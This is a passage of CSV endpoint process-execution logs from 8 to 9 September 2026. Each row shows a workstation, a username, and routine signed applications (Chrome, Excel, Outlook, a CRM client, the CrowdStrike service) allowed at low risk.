P00113,2026-09-08 11:27:37,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1f97651c9408d0af072d0122cef210d7ea92ef92bf9f6d33934b38c475648bb5,signed,ALLOWED,Low
P00114,2026-09-08 11:52:33,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",cce167eb1ca5a24bc18d1b124de50d36c3fe941dd827b3738f6315586047837d,signed,ALLOWED,Low
P00115,2026-09-08 11:52:52,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2919a2444d58438bbdc7a57934760e11b5db09225ffa98456bc69484e9d3c2e7,signed,ALLOWED,Low
P00116,2026-09-08 12:15:18,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",12b1edc71ba50036e4d6953a96e00ae5357363daaeb8dbbcecfe9431c28b7f44,signed,ALLOWED,Low
P00117,2026-09-08 12:27:09,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",9e05561099c27668e009dfaf3f3e67fc553664f86d4ecda27ee5b241a7921c78,signed,ALLOWED,Low
P00118,2026-09-08 12:27:45,WKST-FIN-004,tshivute,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",02648593b6ba25646a65cb57dd1748f66bbce8200982c0ff7128ef095cf06d00,signed,ALLOWED,Low
P00119,2026-09-08 12:35:20,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",a134b97e21757ef1f644df16900c0aa0355605ea530f47acf478ffe0e50bc41a,signed,ALLOWED,Low
P00120,2026-09-08 12:36:52,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f28965726387962d627b5c708a90abfd53c63044ab374befc1e992ca31342232,signed,ALLOWED,Low
P00121,2026-09-08 12:43:31,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",aa2f8ce299b9baa56d80a93d87f73b10292e574d051f0269ebf971aefcb11c42,signed,ALLOWED,Low
P00122,2026-09-08 12:46:16,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,ae973bbea28616abd3abb9a78de692e9a78ed02ba92968a3edb80054fc8f762c,signed,ALLOWED,Low
P00123,2026-09-08 12:47:52,WKST-LOAN-018,shilongo,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a6cc9b88754b565090191e0a56745610e4309e3c5f8ca427c1875a2e43287340,signed,ALLOWED,Low
P00124,2026-09-08 12:50:50,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,ee27a1fddd12541e4496f2f9e9ba7596e2be96ccf00eb91eac11ff77277784ae,signed,ALLOWED,Low
P00125,2026-09-08 12:56:27,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",28bae08f6196778948561de11e688d387f24789ae41b20fdc72d79adeec1052d,signed,ALLOWED,Low
P00126,2026-09-08 13:15:06,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8d990bffe86e333c3e7668483d7dd9bf2f19ec0865e92ddc2e3db110ab8ad0cb,signed,ALLOWED,Low
P00127,2026-09-08 13:18:16,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9aa5bf79027c09c3babc8d4c0b58366ed1bd4a6776480a8e8859d012727b8fe3,signed,ALLOWED,Low
P00128,2026-09-08 13:38:36,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",505cc28811154f5adcd05f14d670d59f876851a0256be63cd9933a07199c48d3,signed,ALLOWED,Low
P00129,2026-09-08 13:39:14,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,33b549cd353128d4e1a11841d40402297ac4a07bd8ecbc4480272e00f882ce8b,signed,ALLOWED,Low
P00130,2026-09-08 13:48:27,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ebd81bca223c4b0e32dcd79df7f26c871ccc2a0eca888ac896ff9f7a4cd5b3d3,signed,ALLOWED,Low
P00131,2026-09-08 13:49:39,WKST-FIN-021,jkavari,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",ceae098cfb0ee4e3701bc29ca39d661b785cd782908009abcc36f0ff69b764d9,signed,ALLOWED,Low
P00132,2026-09-08 14:04:27,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c9a860cf745430a62edddeb90fe9a71f65766c06082bc197cedd2f37736f9ca9,signed,ALLOWED,Low
P00133,2026-09-08 14:08:54,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4a2acd965922bb1a5b1745ad75ed4fe793b23157e3f562aa00d468a41625ac33,signed,ALLOWED,Low
P00134,2026-09-08 14:20:31,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",3784be862a8a7705de8d436d1ab4a55d993c23b558a42040e4d015fa8ad06b9f,signed,ALLOWED,Low
P00135,2026-09-08 14:31:17,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",735c0cf4c0f0e48cd295a969497bb8c3628edd1211661ccce56ef2dc5712fa46,signed,ALLOWED,Low
P00136,2026-09-08 14:43:29,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d104ba491ed8567c3dee44c5351741ef894da484446246699c766cb2812c784c,signed,ALLOWED,Low
P00137,2026-09-08 14:44:45,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",30b6401b845957bdbd9fb2051247bdfb7f9e0e4e028a55e1142cd2e6469694d2,signed,ALLOWED,Low
P00138,2026-09-08 14:48:06,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b4fcfea0085c7d17eac0488d7ae63e87f3b59aaca4914ab43cd7d4cef5848102,signed,ALLOWED,Low
P00139,2026-09-08 16:01:13,WKST-MKT-010,ntinda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8962d925376181c2b03c2e51a0cce6876d9be8941021d867017457491264ba2d,signed,ALLOWED,Low
P00140,2026-09-08 16:19:23,WKST-RSK-006,murorua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,459d989300d427946bbc3cc8a10e7e8dc3dcb5c9da216629f1ab1b70dba197f1,signed,ALLOWED,Low
P00141,2026-09-08 16:37:27,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f4814059d2243f3bed1696c873c6a139d9c91ba2063e074222eb44b9b6ba5695,signed,ALLOWED,Low
P00142,2026-09-08 16:59:17,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,9c4d1dcca281dfa5002d773da1c16345d1369d8ff8be2cfc29b62aab02e2439a,signed,ALLOWED,Low
P00143,2026-09-08 17:00:52,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",365788da3dd3a9d666a0f337cd449598bf191f227615ce72e0e1eed88975d7ef,signed,ALLOWED,Low
P00144,2026-09-08 17:06:15,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",135ed7f8158d1b45016dbcd18c9f1fdc339517e4fd1ebb2de0317916d4d1c40f,signed,ALLOWED,Low
P00145,2026-09-08 17:31:09,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",71d3ee9a48d0fe74477991f57ed9fb551b6daa0a66de48276eadf5e303b0e6a6,signed,ALLOWED,Low
P00146,2026-09-08 17:32:36,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8aefdf0d822c6a78a7b3cc29083d5c735f921e357d04780cc17bcdc5b0df94f1,signed,ALLOWED,Low
P00147,2026-09-08 17:46:07,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0ea57af8845b5660ab20af48db38dc1729aa9e43b0c4898ddfb51c52962e7748,signed,ALLOWED,Low
P00148,2026-09-08 17:51:24,WKST-CS-006,nnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",cf567c912623dbe7be70fe28cbe9833654a11f701657b8d4dd6c3680050487bb,signed,ALLOWED,Low
P00149,2026-09-08 18:23:24,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",896dcb517f58313fd157f3bdec0c86a911c683ebc0202fe1f3f3d15d0af9a849,signed,ALLOWED,Low
P00150,2026-09-08 18:23:31,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",1143e92d8b8ef2979ed709cfbb255a0b88bc056f008e881c38e0af89665a7166,signed,ALLOWED,Low
P00151,2026-09-08 18:30:25,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a4871865ed680269033bf00a52e8d091b4f874ff49433886023df4cfdf68f882,signed,ALLOWED,Low
P00152,2026-09-08 18:47:37,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c347fe04c5a5ff45b77e9fec3aa26a354629f228d31fd689f28bc6c1edfb9ecf,signed,ALLOWED,Low
P00153,2026-09-08 19:09:55,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,dd99d712dac25b3c8956ddf1231e0f60a6381b99daf6f3c659693ec2d4903469,signed,ALLOWED,Low
P00154,2026-09-08 19:21:36,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b7987edace9d9a08310140fd6abf17528015aca66048f64aa97cf4b4dd25b3e6,signed,ALLOWED,Low
P00155,2026-09-08 19:30:25,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",54a9b48acacfa07940dc7a3b99b00a45ce84f67408b0fadfe8765888d7c1189f,signed,ALLOWED,Low
P00156,2026-09-08 19:36:33,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",dbdfb40c5524cca2f431152cecb54d8bc01a477e612c55a4a63f6ad344c0b184,signed,ALLOWED,Low
P00157,2026-09-08 19:37:04,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8319005b633f3c379870342674f5c72c2e71070e8877a05b0ee666d782978398,signed,ALLOWED,Low
P00158,2026-09-08 19:39:57,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",e36982cb4b184dfa4ea9da378018d7b06d28cd58819f197047a383cf7230c66a,signed,ALLOWED,Low
P00159,2026-09-08 19:48:55,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8748af74d96b098ad42c8a05e01267de805b2b72c495b96ab6ec4163180d1a32,signed,ALLOWED,Low
P00160,2026-09-09 06:03:14,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6288bc6a8f7d6a7433fd37d44665585127a7173978d9733a208723d9621cf72a,signed,ALLOWED,Low
P00161,2026-09-09 06:21:44,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",695210356c463854d2b3cf3f2e441f62579fd07fa351e231773877d26682d6f8,signed,ALLOWED,Low
P00162,2026-09-09 06:25:33,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4844bd14f9ad8c8d2440525ba09c859ef7329b3e2c0d36efcb4b0248e6e38926,signed,ALLOWED,Low
P00163,2026-09-09 06:38:50,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7ee6e4d1f10dc82b8013a625d4a809a52b33cd160416cd5aaeb43f3e62e3d86e,signed,ALLOWED,Low
P00164,2026-09-09 06:42:12,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",673d8f82f85694d12e85bd00599f193dc0ca545d937b7b60e4447da66ce13381,signed,ALLOWED,Low
P00165,2026-09-09 06:44:58,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a0d4dbcf683e710e37898f61038f12632aca141a8aee8c1de0b27e977cd69a9b,signed,ALLOWED,Low
P00166,2026-09-09 06:54:23,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",63ea247e87cefb02c3f797dfd4d4ba8e50d4ecbd686df9fe0f68774f55fc5d45,signed,ALLOWED,Low
P00167,2026-09-09 06:54:35,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e587030416b88ae4c34c50c0bd4b1ba93b3814054d410f24b8a844c1cdf34355,signed,ALLOWED,Low
P00168,2026-09-09 07:06:22,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3bc9fbb9244e7c55795d15b96bd258344b0483361b6525b8780b28ac4a9d8f9d,signed,ALLOWED,Low
P00169,2026-09-09 07:15:01,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",8dcb3da37ab26fc95db5f28ff04f0aa8a48b8bc14070df24324fcd96c0c53d2b,signed,ALLOWED,Low
P00170,2026-09-09 07:30:43,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",359de023c7f3b68c3ff6479888d8ebc3a3a4b04db49102b9d0a0c6a66a2d372f,signed,ALLOWED,Low
P00171,2026-09-09 07:41:29,WKST-AUD-004,tjirera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0f0a513c2a7c3ba5d5f3e1463996de2c0fbe407f30ec1e691fd756f3f23bcbb0,signed,ALLOWED,Low
P00172,2026-09-09 07:59:29,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d496a2091765d7e2dd3576c01b76556a08cb1cc2cb8277c8d3fe6a357c8d76d8,signed,ALLOWED,Low
P00173,2026-09-09 07:59:34,WKST-CS-011,tkamati,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",21c5a2c7b682141ecd75d114b778351e51624da29d6484b25375b47914152b7e,signed,ALLOWED,Low
P00174,2026-09-09 08:20:40,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",198d823638469970dddba088764a27d3bcd018210efd629e0afbfb32e22f4def,signed,ALLOWED,Low
P00175,2026-09-09 08:20:56,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",99e583ee82323ff1aaa7481c706c6c3fc15b0f91740d740857f726068e00d85a,signed,ALLOWED,Low
P00176,2026-09-09 09:03:12,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",5a396098d931fe17449b11b9d66032a078dc35b2419d1c67587625be592e7092,signed,ALLOWED,Low
P00177,2026-09-09 09:13:17,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",911065754f960e2a0958d047aaa50484dead66d97d42f23e995a87bbad187b28,signed,ALLOWED,Low
P00178,2026-09-09 09:20:18,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,72e29c6ce7752a1dcb081cc65c247d51c724b7d021a8b3bedfe44e8e9a2c4cf6,signed,ALLOWED,Low
P00179,2026-09-09 09:21:19,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",71c8ea691d14aa88f720d7a964939a16f0e5a218e6a858eb52e912b4321ae1e2,signed,ALLOWED,Low
P00180,2026-09-09 09:21:54,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3717473ade151f8c8a046ed53964cda4b11264992209d7dbc539e2e197c9d26e,signed,ALLOWED,Low
P00181,2026-09-09 09:39:15,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ccaa74fe065b67544a5936cd44a506aeff11aa4d0d6c9d0574440e5ee85dc085,signed,ALLOWED,Low
P00182,2026-09-09 09:39:58,WKST-RSK-006,murorua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",65245b29d61ce39e55160fccd921e0bc09aa18a0577f1989e916cd17fed2b81f,signed,ALLOWED,Low
P00183,2026-09-09 09:41:03,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,57cd0f003b0deb84e50f68634e07f9bc8e424ae1c205dff31a98fea324989318,signed,ALLOWED,Low
P00184,2026-09-09 09:46:47,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3f6d4ceb2af4623cf6d9f176e77c12d9a5827ec1503a730d55c8d7f120125b95,signed,ALLOWED,Low
P00185,2026-09-09 09:54:36,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ced955887931cc43cdb3efcd1ff21c4403c5627697717b14f5e8c3be81470d51,signed,ALLOWED,Low
P00186,2026-09-09 09:59:30,WKST-CMP-009,kndjavera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",4311abd51ddc1655ab675ef6c0083ce971b154cee09bf4fe0ae0f934ee620822,signed,ALLOWED,Low
P00187,2026-09-09 09:59:47,WKST-MKT-010,ntinda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f839dc5f6260fb2aa2905fabaa64d3a3ad2bd5821afce15507336a9037c7b02b,signed,ALLOWED,Low
P00188,2026-09-09 10:18:13,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,99107829bc05563069f17f632331aa16f0e1a03e531e2291dbf78cd348dab2fa,signed,ALLOWED,Low
P00189,2026-09-09 10:28:39,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",17652f9d4d9ef52b3a91abee8ce7206ea5ec22d55cdf929b21cc2a97a7637693,signed,ALLOWED,Low
P00190,2026-09-09 10:31:55,WKST-HR-002,pnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",09e67a4782cea3cacc9ab9fa6426cb9cf429582645d9a0618eb00d55c383757c,signed,ALLOWED,Low
P00191,2026-09-09 10:46:20,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e8bc6d07a835d93e6f6ec72780fe5c9fdd7b18fa0fc2b555c89284a92bdf1c22,signed,ALLOWED,Low
P00192,2026-09-09 11:02:42,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",add44c483e968d87e3dfa1c4626a0081faa7df5abc680968ee640c9bd9c59e0c,signed,ALLOWED,Low
P00193,2026-09-09 11:20:38,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8b894431697410b035511463ad986262f09442299897079159b021360de1da1c,signed,ALLOWED,Low
P00194,2026-09-09 11:25:20,WKST-FIN-004,tshivute,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2748fe77b4d9577790b287f9d63e03551ef9c3c6528c9ed6413917c980d6d592,signed,ALLOWED,Low
P00195,2026-09-09 11:29:35,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ee142bb7297a1f22308af80cfc764e422056ff2a7a2254859c63c58a61102655,signed,ALLOWED,Low
P00196,2026-09-09 11:42:54,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",f63a12a670b46fced66ef6c02a26176ef32c42927f2b7ac0bee5c770681d25c7,signed,ALLOWED,Low
P00197,2026-09-09 12:21:56,WKST-HR-002,pnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",c813682082a1da6d6adeb6e838672d62ea1c61b2c0f985cdc34eb21510f7e4c8,signed,ALLOWED,Low
P00198,2026-09-09 12:21:57,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5cea5e20bc390a90663f5d54feecd2ff0b238fdbfc4d86c37b6646be507b0995,signed,ALLOWED,Low
P00199,2026-09-09 12:45:05,WKST-RSK-006,murorua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e44746646727c966a78ed45cdae00230928bc4b85c605a19586ee709b04ca417,signed,ALLOWED,Low
P00200,2026-09-09 13:18:35,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",913d15055eddf0fa96dcb7820dd2affb51bba143d6fa71da4da1e7c9678716bc,signed,ALLOWED,Low
P00201,2026-09-09 13:21:25,WKST-FIN-021,jkavari,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",46b3d55a8649af37adc1a07f46ebfa5e600b78ac39b63e74079d7aa8aa3b7c6d,signed,ALLOWED,Low
P00202,2026-09-09 13:42:57,WKST-FIN-004,tshivute,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ebf8ddcd7cbc456e881f2280a03ecb3e6978c5d7f864e7fa245f29f5a0dc9328,signed,ALLOWED,Low
P00203,2026-09-09 13:48:40,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",39a352b2513b79da5439543247d3875024816c7065d3ca7be7dbf2a202ce65f8,signed,ALLOWED,Low
P00204,2026-09-09 13:49:31,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",115974e313e3bbc7e32bcc33abaac10232cc0fd6d7f24aa433ef0abe6ea71613,signed,ALLOWED,Low
P00205,2026-09-09 14:05:51,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",14b8fef3c11ffdac8d2987e45ebf160f6f58e3ffad6c3db396327136979682fb,signed,ALLOWED,Low
P00206,2026-09-09 14:06:53,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8848491256affb82980974c124df00364a6e06c975ffdfe16779647639cd9d64,signed,ALLOWED,Low
P00207,2026-09-09 14:09:11,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",5d11a3b2a0140d7a0691eac83e2e13e0475e06e912a6071c475cb11ddf3cc391,signed,ALLOWED,Low
P00208,2026-09-09 14:13:53,WKST-IT-012,katjiuongua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",5d2b7fe885b7319853c3045a743af9c80da425736c4eb7e261a5fc87e3a5d66c,signed,ALLOWED,Low
P00209,2026-09-09 14:22:55,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2f77637f4bc3f9a3dc72d224e39a8fa4b60a41a71d43849f12337854db2f8119,signed,ALLOWED,Low
P00210,2026-09-09 14:29:39,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",032ebb653ac2ee6fd1bd4879b0dd26e02821e22b52ad881588047b621b284664,signed,ALLOWED,Low
P00211,2026-09-09 14:58:12,WKST-HR-014,mukwambi,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b0dd2c29dcc32cb9a9c7d4cd65a66281c41f3a02dd68ca7a2495f424955fcc5c,signed,ALLOWED,Low
P00212,2026-09-09 15:00:24,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",90e3a6b69954573416a24715f4476fb62b3324414b90cd3f3ccd4bc9673fb43c,signed,ALLOWED,Low
P00213,2026-09-09 15:01:20,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",727f4f5b65bb2d9d54b7057db8cc6b803b4b2301771ff697de15039a131f5e14,signed,ALLOWED,Low
P00214,2026-09-09 15:14:00,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,68ac57ee7422d6e34d26a5bc8bc35fa5123302026cde5edfc972475add9ce6a6,signed,ALLOWED,Low
P00215,2026-09-09 15:17:50,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8d28486f2b3b96a2ae8c0fe0f8b11dd81d6a1d5e3124e45670030cf96721cb73,signed,ALLOWED,Low
P00216,2026-09-09 15:35:21,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2db2f41d621255f49cc2dc9318a800f67a9a5f563f9876a278c038734d03ff02,signed,ALLOWED,Low
P00217,2026-09-09 15:52:00,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5f7c657a9f289d583db739f2d746f031ee3c36bb591587aa6c6d2b249af58d22,signed,ALLOWED,Low
P00218,2026-09-09 15:56:14,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",44f98cdc792f44d8cd1044cf96942a62807aeadba86c7a6a39a23603161e401c,signed,ALLOWED,Low
P00219,2026-09-09 16:27:19,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",5eb0fff813c519f14be338369a181fe120489d56331740daa3c888aa30794be2,signed,ALLOWED,Low
P00220,2026-09-09 16:28:00,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",069411696e20ca766c541913d784d92dd07ad8ccf03bca50d2dc4e0f2a857a20,signed,ALLOWED,Low
P00221,2026-09-09 17:04:02,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,bd58be9f7d792cd7dd244a570987407686455ae671c6ecb65a0ca86719a90af3,signed,ALLOWED,Low
P00222,2026-09-09 17:08:07,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",66ec57ee5c72bc88332323efd7a37a38b2319515682ed724e87d18ceffc37a34,signed,ALLOWED,Low
P00223,2026-09-09 17:10:54,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",fd78e9af9abcc0456686548d77a3b416196377893a2237d8a0e40dcb507cf6cc,signed,ALLOWED,Low
P00224,2026-09-09 17:22:15,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c646fad438a4190352b9c69dedc4e7f1163a453e1388a721a4dcf90a2cced9b0,signed,ALLOWED,Low
P00225,2026-09-09 17:39:05,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0194d8762c0ab1b2c67791179f8c280654aef0ada91cf844e3f5b8db487d8e1b,signed,ALLOWED,Low
